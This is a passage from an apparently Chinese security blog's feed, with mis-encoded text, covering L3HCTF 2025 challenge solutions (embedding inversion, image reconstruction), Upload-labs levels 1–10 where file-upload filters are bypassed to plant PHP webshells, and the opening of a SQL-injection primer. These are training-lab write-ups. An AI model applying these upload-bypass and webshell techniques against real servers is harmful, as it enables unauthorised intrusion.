dtype=torch.float32)<br><br><span class="hljs-comment"># åˆå§‹åŒ–éšæœºå›¾ç‰‡</span><br>image = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">224</span>, <span class="hljs-number">224</span>, requires_grad=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># éšæœºåˆå§‹åŒ–</span><br>optimizer = torch.optim.Adam([image], lr=<span class="hljs-number">0.1</span>)<br>criterion = torch.nn.MSELoss()<br><br><span class="hljs-comment"># ä¼˜åŒ–å¾ªç¯</span><br><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    optimizer.zero_grad()<br>    generated_embedding = feature_extractor(image)[<span class="hljs-number">0</span>]<br>    loss = criterion(generated_embedding, user_embedding)<br>    loss.backward()<br>    optimizer.step()<br>    <span class="hljs-comment"># é™åˆ¶åƒç´ å€¼èŒƒå›´</span><br>    image.data = torch.clamp(image.data, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> step % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Step <span class="hljs-subst">&#123;step&#125;</span>, Loss: <span class="hljs-subst">&#123;loss.item()&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> loss.item() &lt; <span class="hljs-number">5e-6</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># ä¿å­˜ç”Ÿæˆçš„å›¾ç‰‡</span><br>generated_img = image.detach().squeeze(<span class="hljs-number">0</span>).permute(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>).numpy()<br>generated_img = (generated_img * <span class="hljs-number">255</span>).astype(np.uint8)<br>Image.fromarray(generated_img).save(<span class="hljs-string">&quot;generated_user_image.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥cmdæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -F <span class="hljs-string">&quot;file=@generated_user_image.png&quot;</span>  http://1.95.8.146:50001/signin/<br></code></pre></td></tr></table></figure><h2 id="LearnRAG"><a href="#LearnRAG" class="headerlink" title="LearnRAG"></a>LearnRAG</h2><p><strong>åˆ†æï¼š</strong><br>RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ æ˜¯ä¸€ç§ç»“åˆäº†ä¿¡æ¯æ£€ç´¢æŠ€æœ¯ä¸è¯­è¨€ç”Ÿæˆæ¨¡å‹çš„äººå·¥æ™ºèƒ½æŠ€æœ¯ã€‚å®ƒå°†æ£€ç´¢å™¨å’Œå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMsï¼‰ç»“åˆä½¿ç”¨ï¼Œä½¿å¾—æ¨¡å‹èƒ½å¤Ÿé€šè¿‡æœç´¢åº“å®æ—¶æ›´æ–°å†…å®¹ï¼Œå¯ä»¥å®æ—¶æŸ¥è¯¢å¤–éƒ¨çŸ¥è¯†ã€‚<br>æŸ¥çœ‹æ–‡ä»¶å­—ç¬¦ä¸²ï¼š<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723180632528.png"><br>å‘ç°è¯¥<code>pickle</code>æ–‡ä»¶å­˜å‚¨äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>ä¸€ä¸ªåä¸º<code>RagData</code>çš„ç”¨æˆ·è‡ªå®šä¹‰ç±»å®ä¾‹</li><li><code>sentence-transformers/gtr-t5-base</code>æ¨¡å‹çš„åµŒå…¥å‘é‡<br>å› æ­¤æœ¬é¢˜çš„æ€è·¯ä¾¿æ˜¯é€šè¿‡åµŒå…¥å‘é‡<code>embedding</code>æ¥åè½¬åµŒå…¥ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/vec2text/vec2text">GitHub - vec2text&#x2F;vec2text</a><br>ç¨å¾®ä¿®æ”¹ä¸€ä¸‹é¡¹ç›®ç»™å‡ºçš„è„šæœ¬ä»£ç å³å¯ã€‚<br><strong>ä»£ç ï¼š</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> vec2text<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModel, AutoTokenizer<br><br><span class="hljs-comment">#è·³è¿‡ç©ºå£³ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RagData</span>: <br>    <span class="hljs-keyword">pass</span><br><br>encoder = AutoModel.from_pretrained(<span class="hljs-string">&quot;sentence-transformers/gtr-t5-base&quot;</span>).encoder.to(<span class="hljs-string">&quot;cuda&quot;</span>)<br>tokenizer = AutoTokenizer.from_pretrained(<span class="hljs-string">&quot;sentence-transformers/gtr-t5-base&quot;</span>)<br>corrector = vec2text.load_pretrained_corrector(<span class="hljs-string">&quot;gtr-base&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rag_data.pkl&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    obj = pickle.load(f)<br>embeddings = torch.tensor(obj.embeddings, dtype=torch.float32)<br><br><br>texts = vec2text.invert_embeddings(<br>    embeddings=embeddings.cuda(),<br>    corrector=corrector,<br>    num_steps=<span class="hljs-number">20</span>,<br>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> texts:<br>    <span class="hljs-built_in">print</span>(i.strip())<br></code></pre></td></tr></table></figure><p><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723202738578.png"></p><h2 id="PaperBack"><a href="#PaperBack" class="headerlink" title="PaperBack"></a>PaperBack</h2><p>æ ¹æ®é¢˜ç›®æä¾›çš„çº¿ç´¢è¿›è¡Œæœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€æ¬¾OllyDbgå¼€å‘çš„åä¸ºPaperBackçš„å·¥å…·ï¼Œå®ƒèƒ½å¤Ÿå°†æ–‡ä»¶ä»¥è¶…å¤§ä½å›¾çš„å½¢å¼å¤‡ä»½åˆ°æ™®é€šçº¸å¼ ä¸Šã€‚<br>å·¥å…·ï¼š<a href="https://ollydbg.de/Paperbak/">PaperBack</a><br>ä½¿ç”¨å·¥å…·çš„Open BitmapåŠŸèƒ½å¯ä»¥å¾—åˆ°<code>flag.ws</code>æ–‡ä»¶ï¼Œè§‚å¯Ÿæ–‡ä»¶åç¼€å’Œæ–‡ä»¶å†…å®¹ï¼Œæ¨æ–­åº”è¯¥æ˜¯Whitespaceä»£ç ï¼Œç›´æ¥åœ¨çº¿å·¥å…·è¿è¡Œå³å¯å¾—åˆ°flagã€‚<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723221837157.png"></p><h2 id="Why-not-read-it-out"><a href="#Why-not-read-it-out" class="headerlink" title="Why not read it out"></a>Why not read it out</h2><p>å…ˆæŸ¥çœ‹æ–‡ä»¶äºŒè¿›åˆ¶æ•°æ®ï¼Œå‘ç°æ–‡ä»¶æœ«å°¾åƒæ˜¯base64<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723222748335.png"><br>å°è¯•ä¹‹åï¼Œå‘ç°æ˜¯base64é€†åºï¼Œè§£ç ä¹‹åå¾—åˆ°æç¤º<code>IGN Review</code><br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723222704644.png"><br>åŒæ—¶è§‚å¯Ÿåˆ°è¯¥æ–‡ä»¶æ˜¯jpgæ–‡ä»¶ï¼Œå°†åç¼€åæ”¹ä¸º<code>.jpg</code><br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/README.jpg"><br>æœ‰ç‚¹æ²¡çœ‹æ‡‚ï¼Œè°·æ­Œè¯†å›¾ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€æ¬¾æ¸¸æˆ<code>Trunic</code>ä¸­çš„è¯­è¨€ï¼Œç»“åˆå‰é¢å¾—åˆ°çš„æç¤ºï¼Œæœç´¢<code>IGN review Trunic</code><br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723224419514.png"><br>å‰å¾€<code>IGN Review</code>ï¼š <a href="https://www.ign.com/articles/tunic-review-xbox-pc-steam">https://www.ign.com/articles/tunic-review-xbox-pc-steam</a> æŸ¥çœ‹ä¹‹åï¼Œå‘ç°å‰ä¸¤æ®µè·Ÿå›¾ç‰‡ä¸­çš„å¯†æ–‡ç±»ä¼¼ï¼Œå› æ­¤ä¾¿å¯ä»¥ä¸€ä¸ªä¸€ä¸ªå¯¹ç…§å¾—åˆ°å¯¹ç…§è¡¨ï¼Œä»è€Œè§£å‡ºåäº”å¥å…³é”®å¯†æ–‡ã€‚<br><img src="/2025/07/20/L3HCTF%202025%20WriteUp/file-20250723225231687.png"><br>è§£å‡ºçš„æ˜æ–‡å¦‚ä¸‹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1. The content of flag is: come on little brave fox.<br>2. Replace letter O with number 0, letter L with number 1.<br>3. Replace letter A with symbol at(@).<br>4. Make every letter E uppercase.<br>5. Use underline to link each word.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>L3HCTF</tag>
      
      <tag>XCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uploads-labsé€šå…³ç¬”è®°ï¼ˆ1-10ï¼‰</title>
    <link href="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/"/>
    <url>/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h4 id="ï¼ˆ1ï¼‰Pass-01"><a href="#ï¼ˆ1ï¼‰Pass-01" class="headerlink" title="ï¼ˆ1ï¼‰Pass-01"></a>ï¼ˆ1ï¼‰<strong>Pass-01</strong></h4><p>å…ˆå°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬phpæ–‡ä»¶è¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°ç›´æ¥è¿”å›æ–‡ä»¶ç±»å‹é”™è¯¯ï¼Œä¸”æŠ“åŒ…å¤±è´¥ï¼Œç»“åˆæºç åˆ†æï¼Œåº”è¯¥æ˜¯æ–‡ä»¶ç±»å‹åœ¨å‰ç«¯ä¾¿è¿›è¡Œäº†éªŒè¯<br>Â <br><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092136817.png"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆä¿®æ”¹æœ¨é©¬æ–‡ä»¶çš„åç¼€åï¼Œç„¶åæˆåŠŸæŠ“åŒ…</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092200319.png"></p><p>å³é”®å‘é€åˆ°repeaterä¸­sendï¼Œç„¶åæŸ¥æ‰¾æ–‡ä»¶ä¸Šä¼ è·¯å¾„</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092219427.png">Â </p><p>ç„¶åæäº¤æŸ¥çœ‹ç»“æœ</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092232128.png">Â </p><p>ä½¿ç”¨èšå‰‘æµ‹è¯•è¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092242310.png">Â </p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092257953.png"></p><h4 id="ï¼ˆ2ï¼‰Pass-02"><a href="#ï¼ˆ2ï¼‰Pass-02" class="headerlink" title="ï¼ˆ2ï¼‰Pass-02"></a>ï¼ˆ2ï¼‰<strong>Pass-02</strong></h4><p>å…ˆç›´æ¥ä¸Šä¼ phpå‘ç°è¿”å›é”™è¯¯ä¿¡æ¯</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092326693.png"></p><p>æç¤ºæ–‡ä»¶ç±»å‹é”™è¯¯ï¼Œæ¥ä¸‹æ¥è¿›è¡ŒbpæŠ“åŒ…ï¼Œç»“åˆæºç åˆ†æï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºimage&#x2F;jpeg</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092340066.png">Â </p><p>å³é”®å‘é€ç»™repeaterï¼Œå°è¯•è¿›è¡Œä¸Šä¼ ï¼Œå¹¶æŸ¥æ‰¾ä¸Šä¼ è·¯å¾„</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092354522.png"></p><p>ä½¿ç”¨èšå‰‘æˆåŠŸè¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092404430.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092422402.png"></p><h4 id="ï¼ˆ3ï¼‰Pass-03"><a href="#ï¼ˆ3ï¼‰Pass-03" class="headerlink" title="ï¼ˆ3ï¼‰Pass-03"></a>ï¼ˆ3ï¼‰<strong>Pass-03</strong></h4><p>å°è¯•ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092434464.png">Â </p><p>åˆ†ææºç </p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092444754.png"></p><p>æŠ“åŒ…ï¼Œå°†æ–‡ä»¶åç¼€åæ”¹ä¸º.phtml</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092452599.png"></p><p>å‘é€åˆ°repeaterï¼Œsendä¹‹åæœç´¢æ‰¾åˆ°ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„å’Œä¿®æ”¹è¿‡çš„æ–‡ä»¶å</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092512904.png"><br><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092524762.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092535878.png"></p><h4 id="ï¼ˆ4ï¼‰Pass-04"><a href="#ï¼ˆ4ï¼‰Pass-04" class="headerlink" title="ï¼ˆ4ï¼‰Pass-04"></a>ï¼ˆ4ï¼‰<strong>Pass-04</strong></h4><p>æŸ¥çœ‹æºä»£ç </p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092543725.png"><br>ä½†æˆ‘ä»¬å‘.htaccessæ²¡æœ‰è¢«å°ç¦ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨.htaccessæ–‡ä»¶æ¥å°†åç»­çš„æ–‡ä»¶è½¬å˜ä¸º.phpæ–‡ä»¶ã€‚å…ˆåˆ›å»º.htaccessæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">SetHandler application/x-httpd-php<br></code></pre></td></tr></table></figure><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092555106.png"></p><p>ç„¶åä¸Šä¼ 130_4.phpæ–‡ä»¶ï¼ŒæŠ“åŒ…ï¼Œå³é”®é€å…¥repeaterï¼Œä¿®æ”¹æ–‡ä»¶ååç¼€ä¸º.pngï¼Œç„¶åsendï¼Œå†æŸ¥æ‰¾ä¸Šä¼ è·¯å¾„</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092606385.png"></p><p>èšå‰‘è¿æ¥æˆåŠŸ</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092631432.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092642245.png"></p><h4 id="ï¼ˆ5ï¼‰Pass-05"><a href="#ï¼ˆ5ï¼‰Pass-05" class="headerlink" title="ï¼ˆ5ï¼‰Pass-05"></a>ï¼ˆ5ï¼‰<strong>Pass-05</strong></h4><p>æŸ¥çœ‹æºç ï¼Œä»ç„¶å­˜åœ¨å¾ˆå¤šé»‘åå•</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092656245.png"></p><p>è€Œä¸”æˆ‘ä»¬ä¸Šä¸€å…³ä½¿ç”¨çš„.htaccessä¹Ÿè¢«å°ç¦</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092702961.png"></p><p>åˆ†ææºç ï¼Œå‘ç°ä»£ç ä¼šåˆ é™¤æ–‡ä»¶æœ«å°¾çš„ç‚¹å’Œç©ºæ ¼ï¼Œå› æ­¤è¿™é‡Œä½¿ç”¨â€œåŒå†™ç‚¹+ç©ºæ ¼â€è¿›è¡Œç»•è¿‡</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092713984.png"></p><p>è¿›è¡Œèšå‰‘è¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092722858.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092736681.png"></p><h4 id="ï¼ˆ6ï¼‰Pass-06"><a href="#ï¼ˆ6ï¼‰Pass-06" class="headerlink" title="ï¼ˆ6ï¼‰Pass-06"></a>ï¼ˆ6ï¼‰<strong>Pass-06</strong></h4><p>åˆ†ææºç ï¼Œå‘ç°æ²¡æœ‰å¤§å°å†™è½¬æ¢çš„ä»£ç ï¼Œå› æ­¤å°è¯•ä½¿ç”¨å¤§å°å†™ç»•è¿‡</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092746807.png"></p><p>bpæŠ“åŒ…ä¿®æ”¹åç¼€åçš„å¤§å°å†™ä¸º.phPï¼Œå¹¶åœ¨Repeaterä¸­æŸ¥çœ‹ä¸Šä¼ è·¯å¾„</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092755555.png"></p><p>è¿›è¡Œèšå‰‘è¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092802986.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092813314.png"></p><h4 id="ï¼ˆ7ï¼‰Pass-07"><a href="#ï¼ˆ7ï¼‰Pass-07" class="headerlink" title="ï¼ˆ7ï¼‰Pass-07"></a>ï¼ˆ7ï¼‰<strong>Pass-07</strong></h4><p>åˆ†ææºç ï¼Œå‘ç°æ²¡æœ‰å¤„ç†ç©ºæ ¼</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092819995.png"></p><p>å› æ­¤ä½¿ç”¨ç©ºæ ¼ç»•è¿‡ï¼ŒåŒæ ·çš„æŠ“åŒ…æ­¥éª¤</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092835060.png"></p><p>èšå‰‘è¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092846483.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092853532.png"></p><h4 id="ï¼ˆ8ï¼‰Pass-08"><a href="#ï¼ˆ8ï¼‰Pass-08" class="headerlink" title="ï¼ˆ8ï¼‰Pass-08"></a>ï¼ˆ8ï¼‰<strong>Pass-08</strong></h4><p>åˆ†ææºç ï¼Œå‘ç°æ²¡æœ‰å¤„ç†æœ«å°¾çš„ç‚¹</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092903914.png"></p><p>å› æ­¤æŠ“åŒ…åœ¨åç¼€ååæ·»åŠ ç‚¹è¿›è¡Œç»•è¿‡</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092911367.png"></p><p>èšå‰‘è¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092919001.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092926821.png"></p><h4 id="ï¼ˆ9ï¼‰Pass-09"><a href="#ï¼ˆ9ï¼‰Pass-09" class="headerlink" title="ï¼ˆ9ï¼‰Pass-09"></a>ï¼ˆ9ï¼‰<strong>Pass-09</strong></h4><p>åˆ†ææºç ï¼Œå‘ç°æœªå»é™¤::$DATA</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092934051.png"></p><p>å› æ­¤ä½¿ç”¨åœ¨åç¼€åæœ«å°¾æ·»åŠ ::$DATAï¼Œè®©phpæ–‡ä»¶è¢«å½“ä½œæ–‡ä»¶æµå¤„ç†ï¼Œä¾¿ä¸ä¼šè¿›è¡Œåç¼€åæ£€æŸ¥ã€‚è¿›è¡ŒbpæŠ“åŒ…ï¼Œå‘é€åˆ°repeater</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092944548.png"></p><p>èšå‰‘è¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093023270.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093030931.png"></p><h4 id="ï¼ˆ10ï¼‰Pass-10"><a href="#ï¼ˆ10ï¼‰Pass-10" class="headerlink" title="ï¼ˆ10ï¼‰Pass-10"></a>ï¼ˆ10ï¼‰<strong>Pass-10</strong></h4><p>åˆ†ææºç ï¼Œè™½ç„¶æ–‡ä»¶å¯¹æœ«å°¾çš„ç¬¦å·éƒ½è¿›è¡Œäº†å¤„ç†ï¼Œä½†æ˜¯æ²¡æœ‰è¿›è¡Œåç¼€ååŒå†™çš„å¤„ç†ï¼Œå› æ­¤å¯å°†æ–‡ä»¶ååç¼€æ”¹ä¸º.phpphpè¿›è¡Œç»•è¿‡</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093043830.png"></p><p>BpæŠ“åŒ…ï¼Œé€å…¥Repeaterï¼Œä¿®æ”¹æ–‡ä»¶åç¼€åŒå†™ï¼Œå¹¶æœç´¢åˆ°ä¸Šä¼ è·¯å¾„</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093051665.png"></p><p>èšå‰‘è¿æ¥</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093059114.png"></p><p>æˆåŠŸä½¿ç”¨èšå‰‘getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093115655.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Webå…¥é—¨</title>
    <link href="/2025/07/04/Web%E5%85%A5%E9%97%A8/"/>
    <url>/2025/07/04/Web%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€sqlæ³¨å…¥"><a href="#ä¸€ã€sqlæ³¨å…¥" class="headerlink" title="ä¸€ã€sqlæ³¨å…¥"></a>ä¸€ã€sqlæ³¨å…¥</h1><p><strong>é¶åœºï¼š</strong> dvwa<br><strong>æ•°æ®åº“ï¼š</strong> Mysql</p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>SQLæ³¨å…¥æ¼æ´éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li><strong>å‚æ•°ç”¨æˆ·å¯æ§</strong></li><li><strong>å‚æ•°å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢</strong><br>åªæœ‰æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶æ‰å¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´</li></ul><h2 id="æ³¨å…¥æ–¹æ³•"><a href="#æ³¨å…¥æ–¹æ³•" class="headerlink" 